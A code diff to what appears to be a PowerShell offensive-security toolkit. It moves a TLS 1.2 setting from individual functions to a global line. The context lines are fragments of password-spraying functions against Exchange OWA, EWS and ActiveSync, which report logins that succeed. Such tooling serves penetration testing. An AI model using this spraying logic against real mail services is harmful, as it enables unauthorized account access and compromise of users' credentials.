@@ -1,3 +1,6 @@
+#  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter. 
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 function Get-UserPRTToken {
   <#
   .SYNOPSIS
@@ -2495,8 +2498,7 @@ function Invoke-PasswordSprayOWA{
 	$form = $owa.Forms[0]
 	$form.fields.password=$Password
 	$form.fields.username=$Username
-	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
+	$owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
         #Check cookie in response
         $cookies = $sess.Cookies.GetCookies($OWAURL2)
         foreach ($cookie in $cookies)
@@ -2725,8 +2727,7 @@ function Invoke-PasswordSprayEWS{
                 $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)   
                 try
                 {
-		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId) 
+		    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId) 
                     Write-Output "[*] SUCCESS! User:$username Password:$Password"
                 }
                 catch
@@ -5001,8 +5002,7 @@ function Invoke-PasswordSprayEAS{
         
       try
 	  {
-	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get -SessionVariable sess -ErrorAction Stop
+	$easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get -SessionVariable sess -ErrorAction Stop
       }
       catch
 	  {
